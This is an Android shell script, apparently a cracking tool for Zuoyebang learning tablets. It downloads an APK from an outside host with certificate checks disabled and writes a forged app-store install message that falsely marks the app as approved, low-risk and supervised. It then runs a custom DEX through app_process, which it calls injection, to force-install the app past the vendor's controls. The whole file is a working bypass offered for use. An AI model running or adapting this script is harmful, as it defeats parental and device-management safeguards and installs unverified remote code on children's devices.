#!/system/bin/sh

export LD_LIBRARY_PATH=/system/lib64:/system/lib:/vendor/lib64:/vendor/lib
export PATH=/system/bin:/system/xbin:/sbin:$PATH


log_info() { echo "[$(date '+%H:%M:%S')] [INFO] $*"; }
log_warn() { echo "[$(date '+%H:%M:%S')] [WARN] $*"; }
log_error() { echo "[$(date '+%H:%M:%S')] [ERROR] $*"; }

#配置区域
APK_URL="https://app.aibangos.xyz/hd.apk"
LOCAL_APK="/storage/emulated/0/hd.apk"            # APK 保留在此处
JSON_FILE="/storage/emulated/0/jc_broadcast.json"  # JSON 写入到此处
PKG_NAME="JC.CODE.V3"
MSG_ID="$(date +%s)12345678"
echo "sh文件作者:man"
log_info "=== 初始化：检查 DEX 文件 ==="

QPY_DIR1="/data/data/org.qpython.qpy3/files"
QPY_DIR2="/data/data/org.qpython.qpy/files"
FOUND_DEX=""

for dir in "$QPY_DIR1" "$QPY_DIR2"; do
    if [ -f "$dir/installer.dex" ]; then
        FOUND_DEX="$dir/installer.dex"
        log_info "  [-] 在 QPython 私有目录找到 DEX: $FOUND_DEX"
        break
    fi
done

if [ -z "$FOUND_DEX" ]; then
    log_warn "  [!] 私有目录没有 DEX，尝试去外部存储寻找..."
    if [ -f "/storage/emulated/0/installer.dex" ]; then
        SRC_DEX="/storage/emulated/0/installer.dex"
        log_info "  [-] 外部存储找到 DEX，正在复制到私有目录..."
        
        for dir in "$QPY_DIR1" "$QPY_DIR2"; do
            if [ -d "$dir" ]; then
                cp "$SRC_DEX" "$dir/installer.dex" 2>/dev/null
                if [ -f "$dir/installer.dex" ]; then
                    FOUND_DEX="$dir/installer.dex"
                    log_info "  [-] 复制成功: $FOUND_DEX"
                    break
                fi
            fi
        done
        
        if [ -z "$FOUND_DEX" ]; then
            log_warn "  [!] 复制失败，将使用外部路径继续执行。"
            FOUND_DEX="$SRC_DEX"
        fi
    else
        log_error "  [!] 致命错误: 私有目录没有，外部存储也没有 installer.dex！"
        log_error "  [!] 请手动放一个到 /storage/emulated/0/ 或者 QPython 私有目录。"
        exit 1
    fi
fi

DEX_PATH="$FOUND_DEX"

chmod 400 "$DEX_PATH" 2>/dev/null
log_info "  [-] 当前使用的 DEX 路径: $DEX_PATH"
# ===============================================================

echo "====================================================================="
log_info "=== JC Code SH  ==="
log_info "当前设备型号: $(getprop ro.product.model) | 系统版本: $(getprop ro.build.version.release)"
echo "====================================================================="

#获取 API 
log_info "[阶段1] 获取系统 API 级别..."
API_LEVEL=$(getprop ro.build.version.sdk)
log_info "  [-] 当前 API 级别 (SDK): $API_LEVEL"
if [ "$API_LEVEL" -ge 31 ]; then
    log_warn "  [!] 系统为 Android 12+"
fi

#检查 DEX 文件
log_info "[阶段2] 检查 DEX 文件..."
if [ -f "$DEX_PATH" ]; then
    log_info "  [-] DEX 文件存在: $DEX_PATH"
else
    log_error "  [!] 致命错误: 未找到 $DEX_PATH！"
    exit 1
fi

# 自动下载 APK
log_info "[阶段3] 检查并准备 APK..."
if [ -f "$LOCAL_APK" ] && [ -s "$LOCAL_APK" ]; then
    log_info "  [-] 发现本地已存在 APK，跳过下载。"
    APK_SIZE=$(du -h "$LOCAL_APK" | awk '{print $1}')
    log_info "  [-] 现有文件大小: $APK_SIZE"
else
    log_info "  [!] 本地未找到 APK，开始下载..."
    log_info "  目标 URL: $APK_URL"
    log_info "  保存到: $LOCAL_APK"

    DOWNLOAD_SUCCESS=0
    if command -v curl >/dev/null 2>&1; then
        log_info "  使用 curl 下载..."
        curl -k -L -o "$LOCAL_APK" "$APK_URL" && DOWNLOAD_SUCCESS=1
    elif command -v wget >/dev/null 2>&1; then
        log_info "  使用 wget 下载..."
        wget --no-check-certificate -O "$LOCAL_APK" "$APK_URL" && DOWNLOAD_SUCCESS=1
    elif command -v busybox >/dev/null 2>&1 && busybox --list | grep -q wget; then
        log_info "  使用 busybox wget 下载..."
        busybox wget -O "$LOCAL_APK" "$APK_URL" && DOWNLOAD_SUCCESS=1
    elif [ -f "/system/bin/curl" ]; then
        log_info "  使用 /system/bin/curl 下载..."
        /system/bin/curl -k -L -o "$LOCAL_APK" "$APK_URL" && DOWNLOAD_SUCCESS=1
    else
        log_error "  [!] 系统中未找到 curl 或 wget。"
        log_error "  [!] 请手动将 hd.apk 下载并放入根目录: $LOCAL_APK"
        exit 1
    fi

    if [ $DOWNLOAD_SUCCESS -ne 1 ] || [ ! -f "$LOCAL_APK" ] || [ ! -s "$LOCAL_APK" ]; then
        log_error "  [!] APK 下载失败或文件为空！"
        exit 1
    fi
    APK_SIZE=$(du -h "$LOCAL_APK" | awk '{print $1}')
    log_info "  [-] 下载完成，文件大小: $APK_SIZE (文件已保留在根目录)"
fi

# 计算 MD5
log_info "[阶段4] 计算 APK 真实 MD5..."
REAL_MD5=$(md5sum "$LOCAL_APK" 2>/dev/null | awk '{print $1}')
if [ -z "$REAL_MD5" ]; then
    REAL_MD5=$(toybox md5sum "$LOCAL_APK" 2>/dev/null | awk '{print $1}')
fi
if [ -z "$REAL_MD5" ]; then
    log_warn "  [!] 无法计算 MD5，使用硬编码值。"
    REAL_MD5="5fa3d1674b1a0ebbe4b6fba22185bfd3"
else
    log_info "  [-] 真实 MD5: $REAL_MD5"
fi

#生成 JSON
log_info "[阶段5] 生成 JSON Payload..."
cat > "$JSON_FILE" <<EOF
{"pkg_name":"com.zuoyebang.iot.pad.appstore","msg_id":"$MSG_ID","sub_type":3,"type":2,"data":{"advertisement":0,"advertisementLabel":"无","age":0,"ageLabel":"","apkMd5":"$REAL_MD5","apkName":"JC.CODE.V3","apkSize":32767,"apkSizeStr":"32767M","apkUrl":"$APK_URL","apkVersion":"3.1.0","apkVersionCode":20,"appIdThird":20,"browseWeb":0,"browseWebLabel":"无","changeLog":"Crack By KON-唯","containPayContent":1,"developer":"Crack By KON-唯","enName":"","entertainment":0,"entertainmentLabel":"无","extraThird":"SkNDb2RlVjM=","from":1,"icon":"https://www.birchua.cn/tb.png","icpNumber":"JC Code","id":2651,"isCtlWhite":0,"isGreenApp":1,"isMonitored":false,"isSensitive":0,"name":"JC Code V3","onShelf":1,"payContentLabel":"","permissions":null,"previewPics":null,"privacyLink":"https://www.birchua.cn","remark":"Crack By KON-唯","remoteInstallMsg":"安装 JC Code V3 中...（Crack By KON-唯）","risk":0,"statusInPad":0,"summary":"Crack By KON-唯","supervise":1,"tags":null,"type":1,"uploadTime":32767,"versionCodeThird":20}}
EOF
log_info "  [-] JSON 生成成功"

#探测系统服务
log_info "[阶段6] 动态探测系统服务..."
ZYB_SERVICE=$(service list 2>/dev/null | grep -i "zybos\|zuoyebang" | head -n 1 | awk '{print $1}' | cut -d: -f1)
if [ -z "$ZYB_SERVICE" ]; then
    log_warn "  [!] 未扫描到明确相关的服务，尝试使用默认名。"
    ZYB_SERVICE="zybos_manager"
else
    log_info "  [-] 探测到潜在目标服务: $ZYB_SERVICE"
    service call "$ZYB_SERVICE" 6 i32 0 2>&1
fi

#执行 app_process 注入
log_info "[阶段7] 执行 app_process 注入..."
log_info "  命令: CLASSPATH=$DEX_PATH /system/bin/app_process /system/bin RemoteInstaller $JSON_FILE $PKG_NAME"
OUTPUT_LOG="/storage/emulated/0/app_process_debug.log"
CLASSPATH="$DEX_PATH" /system/bin/app_process /system/bin RemoteInstaller "$JSON_FILE" "$PKG_NAME" > "$OUTPUT_LOG" 2>&1
EXIT_CODE=$?

if [ -f "$OUTPUT_LOG" ]; then
    log_info "  [--- 注入输出开始 ---]"
    while IFS= read -r line; do echo "  $line"; done < "$OUTPUT_LOG"
    log_info "  [--- 注入输出结束 ---]"
fi

if [ $EXIT_CODE -eq 0 ]; then
    log_info "  [-] app_process 执行成功。"
elif [ $EXIT_CODE -eq 139 ]; then
    log_error "  [!] 崩溃: 触发段错误 (Signal 11) core dumped。"
elif [ $EXIT_CODE -eq 134 ]; then
    log_error "  [!] 崩溃: 触发 Abort (Signal 6) 或 DEX 权限拒绝 (返回码 134)。"
else
    log_error "  [!] 异常退出，返回码: $EXIT_CODE"
fi

echo "====================================================================="
log_info "=== 脚本执行结束 ==="